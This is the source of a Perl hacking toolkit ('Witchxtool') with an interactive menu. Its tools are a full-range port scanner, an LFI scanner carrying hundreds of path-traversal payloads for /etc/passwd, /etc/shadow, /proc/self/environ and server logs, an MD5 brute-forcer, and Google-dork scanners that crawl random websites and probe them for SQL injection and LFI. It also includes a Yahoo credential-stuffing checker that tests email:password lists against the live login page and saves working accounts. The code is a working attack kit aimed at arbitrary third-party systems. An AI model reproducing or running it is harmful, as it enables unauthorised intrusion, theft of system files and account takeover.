#
#        .__  __         .__              __                .__   
#__  _  _|__|/  |_  ____ |  |__ ___  ____/  |_  ____   ____ |  |  
#\ \/ \/ /  \   __\/ ___\|  |  \\  \/  /\   __\/  _ \ /  _ \|  |  
# \     /|  ||  | \  \___|   Y  \>    <  |  | (  <_> |  <_> )  |__
#  \/\_/ |__||__|  \___  >___|  /__/\_ \ |__|  \____/ \____/|____/ V.1.1
#                      \/     \/      \/ 
#Author : th3_w1tch (th3_w1tch <at> coconutstmik.com)
#Home   : http://makassarhacker.com 
#         http://th3w1tch.wordpress.com
#         http://coconutstmik.com
#Thanks For : 
#Makassar Ethical Hacker Crew
#Oghie,d43ngcyb3r,C4V4LeR4,Gameover,Mrs.geena,k1n9cr0c0d1l3,4nt_bL4cK,4r3a_51,Meonkzt,jimmyromanticdevil
#biohaz4rds,Dr.Crash,hitamputihku,p4rcomx.
#COCONUT Computer Club STMIK Profesional & Enigma Group
#!/usr/bin/perl
use IO::Socket::INET;
use Net::RawIP;
use HTTP::Request;
use LWP::UserAgent;
use Term::ANSIColor;
use Digest::MD5 qw(md5_hex);
use LWP::UserAgent;
use LWP::Simple;
use Getopt::Std;
use WWW::Mechanize;
use Data::Validate::IP;
use HTTP::Cookies;
system (clear);
header();
sub header{
  print color "bold yellow";
  print q(
##############################################################################
#                Witchxtool Ver.1.1 | Makassar Ethical Hacker                #
#		          http://makassarhacker.com     	             #
##############################################################################
#         	                Program Menu		                     #
#----------------------------------------------------------------------------#
#  1. Port Scanner   	4. Dork SQLI Scanner	  7. Yahoo Password Checker  #
#  2. LFI Scanner       5. Proxy Fresh Scanner	  8. Help                    #
#  3. MD5 Brute Force 	6. Dork LFI Scanner	                             #
#----------------------------------------------------------------------------#
##############################################################################
#                            Coding By th3_w1tch                             #
#                        http://th3w1tch.wordpress.com		             #
#                               MEH Project 2011                             #
##############################################################################
  ); 
  print colored ['red'], "                         Insert Program Number : ";
  $number=<STDIN>;
  if ($number==1){
    portscanner();
    print colored ['white'],"Back to Menu Press ";
    print colored ['yellow on_white'], " Enter";
    $back=<>;
    system (clear);
    header();
  }
  if ($number==2){
    lfiscanner();
    print colored ['white'],"Back to Menu Press ";
    print colored ['yellow on_white'], " Enter";
    $back=<>;
    system (clear);
    header();
  }
if ($number==3){
    md5brute();
    print colored ['white'],"Back to Menu Press ";
    print colored ['bold white on_red'], " Enter";
    $back=<>;
    system (clear);
    header();
  }
if ($number==4){
    sqli();
    print colored ['white'],"Back to Menu Press ";
    print colored ['bold white on_red'], " Enter";
    $back=<>;
    system (clear);
    header();
  } 
if ($number==5){
    proxy();
    print colored ['white'],"Back to Menu Press ";
    print colored ['bold black on_white'], " Enter";
    $back=<>;
    system (clear);
    header();
  } 
if ($number==6){
    lfidork();
    print colored ['white'],"Back to Menu Press ";
    print colored ['bold black on_white'], " Enter";
    $back=<>;
    system (clear);
    header();
  } 
if ($number==7){
    yahoopasschecker();
    print colored ['white'],"Back to Menu Press ";
    print colored ['bold black on_white'], " Enter";
    $back=<>;
    system (clear);
    header();
  } 
if ($number==8){
    help();
    print colored ['white'],"Back to Menu Press ";
    print colored ['bold black on_white'], " Enter";
    $back=<>;
    system (clear);
    header();
  } 
}

sub portscanner{
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#        		Port Scanner  			      #
#		http://makassarhacker.com     		      #
###############################################################
#             usage -> Target : 192.168.1.1		      #	
#-------------------------------------------------------------#
###############################################################);
  print "\n";
  print "Target: ";
  $target = <STDIN>;
  chomp ($target);
  $port = 1;
  while($port <= 65535){
    $ports = new IO::Socket::INET (
    PeerAddr => $target,
    PeerPort => $port,
    Proto => "tcp");
    if($ports){print "Open -> $port\n";}
    $port++;
  } 
}

sub lfiscanner{
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#        		LFI Scanner  			      #
#		http://makassarhacker.com     		      #
###############################################################
#      usage -> Target : http://site.com/index.php?page=      #	
#-------------------------------------------------------------#
###############################################################);
  print "\n";
  print "Target :";
  chomp($target = <STDIN>);
  if($target !~ /http:\/\//) { $target = "http://$target"; }
  @lfi = ('/etc/passwd',
'../etc/passwd',
'../../etc/passwd',
'../../../etc/passwd',
'../../../../etc/passwd',
'../../../../../etc/passwd',
'../../../../../../etc/passwd',
'../../../../../../../etc/passwd',
'../../../../../../../../etc/passwd',
'../../../../../../../../../etc/passwd',
'../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../etc/passwd',
'../../../../../../../../../../../../../../../../etc/passwd',
'../etc/passwd%00',
'../../etc/passwd%00',
'../../../etc/passwd%00',
'../../../../etc/passwd%00',
'../../../../../etc/passwd%00',
'../../../../../../etc/passwd%00',
'../../../../../../../etc/passwd%00',
'../../../../../../../../etc/passwd%00',
'../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../..etc/passwd%00',
'../proc/self/environ%00',
'../../proc/self/environ%00',
'../../../proc/self/environ%00',
'../../../../proc/self/environ%00',
'../../../../../proc/self/environ%00',
'../../../../../../proc/self/environ%00',
'../../../../../../../proc/self/environ%00',
'../../../../../../../../proc/self/environ%00',
'../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../proc/self/environ%00',
'../../../../../../../../../../../../../../../proc/self/environ%00',
'../proc/self/environ',
'../../proc/self/environ',
'../../../proc/self/environ',
'../../../../proc/self/environ',
'../../../../../proc/self/environ',
'../../../../../../proc/self/environ',
'../../../../../../../proc/self/environ',
'../../../../../../../../proc/self/environ',
'../../../../../../../../../proc/self/environ',
'../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../proc/self/environ',
'../../../../../../../../../../../../../../../proc/self/environ',
'/etc/shadow',
'/etc/group',
'/proc/self/environ',
'/etc/security/group',
'/etc/security/passwd',
'/etc/security/user',
'/etc/security/environ',
'/etc/security/limits',
'/usr/lib/security/mkuser.default',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_ log',
'/usr/local/apache/logs/access. log',
'/var/log/apache/access_log',
'/var/log/apache2/access_log',
'/var/log/apache/access.log',
'/var/log/apache2/access.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/var/log/apache/error_log',
'/var/log/apache2/error_log',
'/var/log/apache/error.log',
'/var/log/apache2/error.log',
'/var/log/error_log',
'/var/log/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/error_log',
'/var/log/httpd/access_log',
'/var/log/httpd/error_log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/apache2/logs/error.log',
'/apache2/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/usr/local/apache2/logs/access_log',
'/usr/local/apache2/logs/access.log',
'/usr/local/apache2/logs/error_log',
'/usr/local/apache2/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/var/log/httpd/access_log',
'/var/log/httpd/access.log',
'/var/log/httpd/error_log',
'/var/log/httpd/error.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/apache2/access_log',
'/var/log/apache2/access.log',
'/var/log/apache2/error_log',
'/var/log/apache2/error.log',
'/var/log/access_log',
'/var/log/access.log',
'/var/log/error_log',
'/var/log/error.log',
'/opt/lampp/logs/access_log',
'/opt/lampp/logs/error_log',
'/opt/xampp/logs/access_log',
'/opt/xampp/logs/error_log',
'/opt/lampp/logs/access.log',
'/opt/lampp/logs/error.log',
'/opt/xampp/logs/access.log',
'/opt/xampp/logs/error.log',
'/Program Files\Apache Group\Apache\logs\access.log',
'/Program Files\Apache Group\Apache\logs\error.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/apache/logs/error.log',
'/apache/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/logs/error.log',
'/logs/access.log',
'/etc/httpd/logs/acces_log',
'/etc/httpd/logs/acces.log',
'/etc/httpd/logs/error_log',
'/etc/httpd/logs/error.log',
'/var/www/logs/access_log',
'/var/www/logs/access.log',
'/usr/local/apache/logs/access_log',
'/usr/local/apache/logs/access.log',
'/var/log/apache/access_log',
'/var/log/apache/access.log',
'/var/log/access_log',
'/var/www/logs/error_log',
'/var/www/logs/error.log',
'/usr/local/apache/logs/error_log',
'/usr/local/apache/logs/error.log',
'/var/log/apache/error_log',
'/var/log/apache/error.log',
'/var/log/access_log',
'/var/log/error_log',
'../etc/shadow',
'../../etc/shadow',
'../../../etc/shadow',
'../../../../etc/shadow',
'../../../../../etc/shadow',
'../../../../../../etc/shadow',
'../../../../../../../etc/shadow',
'../../../../../../../../etc/shadow',
'../../../../../../../../../etc/shadow',
'../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../etc/shadow',
'../../../../../../../../../../../../../../etc/shadow',
'../etc/group',
'../../etc/group',
'../../../etc/group',
'../../../../etc/group',
'../../../../../etc/group',
'../../../../../../etc/group',
'../../../../../../../etc/group',
'../../../../../../../../etc/group',
'../../../../../../../../../etc/group',
'../../../../../../../../../../etc/group',
'../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../etc/group',
'../../../../../../../../../../../../../../etc/group',
'../etc/security/group',
'../../etc/security/group',
'../../../etc/security/group',
'../../../../etc/security/group',
'../../../../../etc/security/group',
'../../../../../../etc/security/group',
'../../../../../../../etc/security/group',
'../../../../../../../../etc/security/group',
'../../../../../../../../../etc/security/group',
'../../../../../../../../../../etc/security/group',
'../../../../../../../../../../../etc/security/group',
'../etc/security/passwd',
'../../etc/security/passwd',
'../../../etc/security/passwd',
'../../../../etc/security/passwd',
'../../../../../etc/security/passwd',
'../../../../../../etc/security/passwd',
'../../../../../../../etc/security/passwd',
'../../../../../../../../etc/security/passwd',
'../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../etc/security/passwd',
'../../../../../../../../../../../../../../etc/security/passwd',
'../etc/security/passwd%00',
'../../etc/security/passwd%00',
'../../../etc/security/passwd%00',
'../../../../etc/security/passwd%00',
'../../../../../etc/security/passwd%00',
'../../../../../../etc/security/passwd%00',
'../../../../../../../etc/security/passwd%00',
'../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../etc/security/passwd%00',
'../../../../../../../../../../../../../../etc/security/passwd%00',
'../etc/security/user',
'../../etc/security/user',
'../../../etc/security/user',
'../../../../etc/security/user',
'../../../../../etc/security/user',
'../../../../../../etc/security/user',
'../../../../../../../etc/security/user',
'../../../../../../../../etc/security/user',
'../../../../../../../../../etc/security/user',
'../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../etc/security/user',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces_log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces.log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/error_log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/error.log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access_log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access.log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error_log%00',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error.log%00',
'../../../../../../../../../../../../../../../usr/lib/security/mkuser.default%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access_log%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access.log%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error_log%00',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error.log%00',
'../../../../../../../../../../../../../../../apache/logs/access.log%00',
'../../../../../../../../../../../../../../../apache/logs/error.log%00',
'../../../../../../../../../../../../../../../apache2/logs/error.log%00',
'../../../../../../../../../../../../../../../apache2/logs/access.log%00',
'../../../../../../../../../../../../../../../var/www/logs/access_log%00',
'../../../../../../../../../../../../../../../var/www/logs/access.log%00',
'../../../../../../../../../../../../../../../var/log/apache/access_log%00',
'../../../../../../../../../../../../../../../var/log/apache2/access_log%00',
'../../../../../../../../../../../../../../../var/log/apache/access.log%00',
'../../../../../../../../../../../../../../../var/log/apache2/access.log%00',
'../../../../../../../../../../../../../../../var/www/logs/error_log%00',
'../../../../../../../../../../../../../../../var/www/logs/error.log%00',
'../../../../../../../../../../../../../../../var/log/access_log%00',
'../../../../../../../../../../../../../../../var/log/access.log%00',
'../../../../../../../../../../../../../../../var/log/apache/error_log%00',
'../../../../../../../../../../../../../../../var/log/apache2/error_log%00',
'../../../../../../../../../../../../../../../var/log/apache/error.log%00',
'../../../../../../../../../../../../../../../var/log/apache2/error.log%00',
'../../../../../../../../../../../../../../../var/log/error_log%00',
'../../../../../../../../../../../../../../../var/log/error.log%00',
'../../../../../../../../../../../../../../../var/log/httpd/access_log%00',
'../../../../../../../../../../../../../../../var/log/httpd/error_log%00',
'../../../../../../../../../../../../../../../var/log/httpd/access.log%00',
'../../../../../../../../../../../../../../../var/log/httpd/error.log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/access_log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/error_log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/access_log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/error_log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/access.log%00',
'../../../../../../../../../../../../../../../opt/lampp/logs/error.log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/access.log%00',
'../../../../../../../../../../../../../../../opt/xampp/logs/error.log%00',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces_log',
'../../../../../../../../../../../../../../../etc/httpd/logs/acces.log',
'../../../../../../../../../../../../../../../etc/httpd/logs/error_log',
'../../../../../../../../../../../../../../../etc/httpd/logs/error.log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access_log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/access.log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error_log',
'../../../../../../../../../../../../../../../usr/local/apache/logs/error.log',
'../../../../../../../../../../../../../../../usr/lib/security/mkuser.default',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access_log',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/access.log',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error_log',
'../../../../../../../../../../../../../../../usr/local/apache2/logs/error.log',
'../../../../../../../../../../../../../../../apache/logs/access.log',
'../../../../../../../../../../../../../../../apache/logs/error.log',
'../../../../../../../../../../../../../../../apache2/logs/error.log',
'../../../../../../../../../../../../../../../apache2/logs/access.log',
'../../../../../../../../../../../../../../../var/www/logs/access_log',
'../../../../../../../../../../../../../../../var/www/logs/access.log',
'../../../../../../../../../../../../../../../var/log/apache/access_log',
'../../../../../../../../../../../../../../../var/log/apache2/access_log',
'../../../../../../../../../../../../../../../var/log/apache/access.log',
'../../../../../../../../../../../../../../../var/log/apache2/access.log',
'../../../../../../../../../../../../../../../var/www/logs/error_log',
'../../../../../../../../../../../../../../../var/www/logs/error.log',
'../../../../../../../../../../../../../../../var/log/access_log',
'../../../../../../../../../../../../../../../var/log/access.log',
'../../../../../../../../../../../../../../../var/log/apache/error_log',
'../../../../../../../../../../../../../../../var/log/apache2/error_log',
'../../../../../../../../../../../../../../../var/log/apache/error.log',
'../../../../../../../../../../../../../../../var/log/apache2/error.log',
'../../../../../../../../../../../../../../../var/log/error_log',
'../../../../../../../../../../../../../../../var/log/error.log',
'../../../../../../../../../../../../../../../var/log/httpd/access_log',
'../../../../../../../../../../../../../../../var/log/httpd/error_log',
'../../../../../../../../../../../../../../../var/log/httpd/access.log',
'../../../../../../../../../../../../../../../var/log/httpd/error.log',
'../../../../../../../../../../../../../../../opt/lampp/logs/access_log',
'../../../../../../../../../../../../../../../opt/lampp/logs/error_log',
'../../../../../../../../../../../../../../../opt/xampp/logs/access_log',
'../../../../../../../../../../../../../../../opt/xampp/logs/error_log',
'../../../../../../../../../../../../../../../opt/lampp/logs/access.log',
'../../../../../../../../../../../../../../../opt/lampp/logs/error.log',
'../../../../../../../../../../../../../../../opt/xampp/logs/access.log',
'../../../../../../../../../../../../../../../opt/xampp/logs/error.log');
  print "Searching . . .\n";
  foreach $scan(@lfi){
    $url = $target.$scan;
    $request = HTTP::Request->new(GET=>$url);
    $ua = LWP::UserAgent->new();
    $response = $ua->request($request);
    if ($response->is_success && $response->content =~ m/:x:/) {print $url, " -> Vulnerable\n";}
    elsif ($response->is_success && $response->content =~ m/"GET/) {print $url, " -> Vulnerable\n";}
    elsif ($response->is_success && $response->content =~ m/DOCUMENT_ROOT/) {print $url, " -> Vulnerable\n";}
    elsif ($response->is_success && $response->content =~ m/\[error\]/) {print $url, " -> Vulnerable\n";}
  }
}

sub md5brute{
  use Digest::MD5 qw(md5_hex);
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#        	     MD5 Brute Force  			      #
#		http://makassarhacker.com     		      #
###############################################################
#   usage -> Insert MD5 : 21232f297a57a5a743894a0e4a801fc3    #
#	     Insert Type [k/B/a/c]: k 		              #
#            Insert Min Length: 4			      #
#            Insert Max Length: 5			      #
#-------------------------------------------------------------#
###############################################################);
  print "\n";
  print "Insert MD5: ";
  $md5=<STDIN>;
  chomp($md5);
  print "Insert Type [k/B/a/c]: ";
  $type=<STDIN>;
  chomp($type);
  print "Insert Min Length: ";
  $k=<STDIN>;
  chomp($k);
  print "Insert Max Length: ";
  $p=<STDIN>;
  chomp($p);
  if ($type=~"k") {$char = "abcdefghijklmnopqrstuvwxyz";}
  if ($type=~"B") {$char = $char. "ABCDEFGHIJKLMNOPQRSTUVWXYZ";}
  if ($type=~"a") {$char = $char."1234567890";}
  if ($type=~"c") {$char = $char. "!\"\$%&/()=?-.:\\*'-_:.;,";}
  sub cari{
    @tampung = (); 
    $shift = shift;
    for ($i =0;$i<$shift;$i++){ $tampung[i] = 0;}
    do{
      for ($i =0;$i<$shift;$i++){
        if ($tampung[$i] > length($char)-1){
          if ($i==$shift-1){
            print color "red";
            print "Password Not Found\n";
            $a=0;
            return false;
          }
          $tampung[$i+1]++;
          $tampung[$i]=0;
        }
      }
      $pass = "";	
      for ($i =0;$i<$shift;$i++){ $pass = $pass . substr($char,$tampung[$i],1);}
      $enkripsi = md5_hex($pass);
      $a++;
      print "$pass -> $enkripsi -> $md5 \n";
      if ($md5 eq $enkripsi){
       print color "red";
       print "Password Cracked = $pass\n";
       print colored ['white'],"Back to Menu Press ";
       print colored ['bold white on_red'], " Enter";
       $back=<>;
       system (clear);
       header();
      }
      $tampung[0]++;
    }
    while($tampung[$shift-1]<length($char));
  }
  for ($x=$k;$x<=$p;$x++){
  cari($x);
  }
}

sub sqli{
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#        	    Dork SQLI Scanner  		              #
#		http://makassarhacker.com     		      #
###############################################################
#            usage -> SQLI DORK : news.php?id=		      #	
#-------------------------------------------------------------#
###############################################################);
print "\n";
print "SQLI Dork : ";
$dork=<STDIN>;
chomp($dork);
print "Scanning . . . \n";
print color 'reset';
for($start = 0;$start != 100*10;$start += 10)
{
    $t = "http://www.google.com/search?hl=fr&q=".$dork."&btnG=Search&start=".$start;
    $ua = LWP::UserAgent->new;
    $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13");
    $response = $ua->get($t);
    if ($response->is_success)
    {
        $c = $response->content;
        @stuff = split(/<a href=/,$c);
        foreach $line(@stuff)
        {
            if($line =~/(.*) class=l/ig)
            {
                $out = $1;
                $out =~ s/"//g;
      $out =~s/$/\'/;
             
    $ua = LWP::UserAgent->new;
    $response = $ua->get($out); 
			$error = $response->content(); 
			if($error =~m/SQL syntax/) 
				{print "$out -> ";
				 print colored ['red'],"Vulnerable MySQL\n";}
							
			elsif($error =~m/Microsoft JET Database/ || $error =~m/ODBC Microsoft Access Driver/) 
				{print "$out -> ";
				print colored ['red'],"Vulnerable MS Access\n";}
								
			elsif($error =~m/Microsoft OLE DB Provider for SQL Server/ || $error =~m/Unclosed quotation mark/) 
				{print "$out -> ";
				 print colored ['red'],"Vulnerable MSSQL\n";}
				
			elsif($error =~m/mysql_fetch_array()/ || $error =~m/mysql_num_rows()/) 
				{print "$out -> ";
				 print colored ['red'],"Vulnerable Blind!\n";}
							
			elsif($error =~m/Microsoft OLE DB Provider for Oracle/) 
				{print "$out -> ";
				 print colored ['red'],"Vulnerable Oracle!\n";}
				
		    } 
		} 
	    } 
        }
}

sub proxy{
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#                  Proxy Fresh Scanner   		      #
#		http://makassarhacker.com     		      #
###############################################################
#          Proxy Fresh From http://proxylist.net	      #	
#-------------------------------------------------------------#
###############################################################);
print "\n";
print "                 Press Enter to Scanning";
$enter=<>;
print "Scanning. . . \n";
  my $proxy  = "http://www.proxylist.net/";
  my $module  = WWW::Mechanize->new();
  $module->get($proxy);
  my @links = $module->links();
  foreach my $link (@links){
    @url_str = split('/',$link->url());
    @ip_str = split(/:/,$url_str[2]);
    if(is_ipv4($ip_str[0])){
      print $ip_str[0].":".$ip_str[1]."\n";
    }
  }
}

sub lfidork{
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#                    Dork LFI Scanner   		      #
#		 http://makassarhacker.com     		      #
###############################################################
#     usage -> Dork : index.php?option=com_ckforms            #
#              Vuln LFI : option=com_ckforms&controller=      #	
#-------------------------------------------------------------#
###############################################################);
print "\n";
@lfi = (
'../../../../../../../../../../../../../../../etc/passwd%00',
'../../../../../../../../../../../../../../../etc/passwd',
#'../../../../../../../../../../../../../../../proc/self/environ%00',
#'../../../../../../../../../../../../../../../proc/self/environ',
);
print "Dork : ";
$dork=<STDIN>;
chomp($dork);
print "Vuln LFI : ";
$inject=<STDIN>;
chomp($inject);
print "Scanning . . .\n";
for($start = 0;$start != 100*10;$start += 10)
{
    $t = "http://www.google.com/search?hl=fr&q=".$dork."&btnG=Search&start=".$start;
    $ua = LWP::UserAgent->new;
    $ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13");
    $response = $ua->get($t);
    if ($response->is_success)
    {
        $c = $response->content;
        @stuff = split(/<a href=/,$c);
        foreach $line(@stuff)
        {
            if($line =~/(.*) class=l/ig)
            {
                $out = $1;
                $out =~ s/"//g;
                $inj="/*.php?";
		foreach $scan(@lfi){
                $get=$out.$inj.$inject.$scan;
                $ua = LWP::UserAgent->new;
                $ua->timeout(10);
		$response = $ua->get($get);
                	$error = $response->content(); 
			#if($error =~ /DOCUMENT_ROOT=\// && $error =~ /HTTP_USER_AGENT/)
				#{print color 'reset';print "$get";  print colored ['red']," -> LFI Vulnerable\n"}
                        if ($error=~ /:x:/)
				{print color 'reset';print "$get";  print colored ['red']," -> LFI Vulnerable\n"}
			
               }
                
          		
            } 
	} 
     } 
 }
print "Scan Finished\n";
}

sub yahoopasschecker{
system (clear);
print color 'reset';
print color "green";
print q(
###############################################################
#                 Yahoo Password Checker                      #
#                http://makassarhacker.com                    #
###############################################################
#     Insert your email and password list in a file check.txt #                                              
#     Format email:password -> abcdef@yahoo.com:123456        #
#-------------------------------------------------------------#
###############################################################
);
print "                   Press Enter to Start";
$enter=<>;
print "Check Login . . .\n";
open (MYFILE, 'check.txt');
while (<MYFILE>) {
 chomp;
 if($_ =~ m/[a-z0-9_\.]\@yahoo(.*?):(.+){6,32}$/i or $_ =~ m/[a-z0-9_\.]\@ymail(.*?):(.+){6,32}$/i or $_ =~ m/[a-z0-9_\.]\@rocketmail(.*?):(.+){6,32}$/i){
  @data = split(/:/, $_);
  $username=$data[0];
  $password=$data[1];
  $myCookies = HTTP::Cookies->new();
  my $ua = LWP::UserAgent->new;
  $ua->cookie_jar($myCookies);
  $ua->agent('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13');
  my $url = ("https://login.yahoo.com/config/login?login=".$username."&passwd=".$password);
  my $login = $ua->get($url);
  if ($login->is_success){
   $respon = $login->content;
    if ($respon=~m/Invalid ID or password/){print $username,":",$password," -> Login Failed\n";}
    else {
     open (FILE, '>>success.txt');
     print FILE "$username",":","$password\n";
     close (FILE);  
     print $username,":",$password," -> Login Success\n";}
  }
 }
}
close (MYFILE);
}

sub help{
  system (clear);
  print color 'reset';
  print color "green";
  print q(
###############################################################
#        	      HELP Witchxtool	 	              #
#		http://makassarhacker.com     		      #
###############################################################
1. Port Scanner -> To know which port(1-65535) are open on the target
          usage -> Target : 192.168.1.1	
                   Open -> 53
                   Open -> 139
                   Open -> 445

2. LFI Scanner -> Find vulnerable local file inclusion on a website
         usage -> Target : http://site.com/index.php?page=

3. MD5 BruteForce -> Perform experiments on all keys that may be the result of the MD5 encryption
            usage ->  Insert MD5 : 21232f297a57a5a743894a0e4a801fc3
                                   admin = 21232f297a57a5a743894a0e4a801fc3
                      Insert Type [k/B/a/c]:kB
                      k= Lowarcase [a-z]
		      B= Upper case [A-Z]
                      a= Number [0-9]
                      c= Character symbol [!"$%&/()=?-.:\*'-_:.;,"]
                      Insert Min Length : 4
                      Insert Max Length : 5
                      
4. Dork SQLI Scanner -> Searching of websites that are vulnerable SQL Injection randomly using google engine  according dork
               usage -> SQLI DORK : news.php?id=

5. Proxy Fresh Scanner -> Looking for a proxy by utilizing the site http://proxylist.net

6. Dork LFI Scanner -> Searching of websites that are vulnerable LFI (Local File Inclusion) randomly using google engine  according dork
              usage -> Dork : index.php?option=com_ckforms            
                       Vuln LFI : option=com_ckforms&controller=

7  Yahoo Password Checker -> Check the password account yahoo  with a large number.
                             Insert your email and password list in a file check.txt 
                             Format email:password -> abcdef@yahoo.com:123456
   after the checking process is completed will form a success.txt file that contains the correct password  account yahoo
);
}
#Makassar Ethical Hacker Project 2011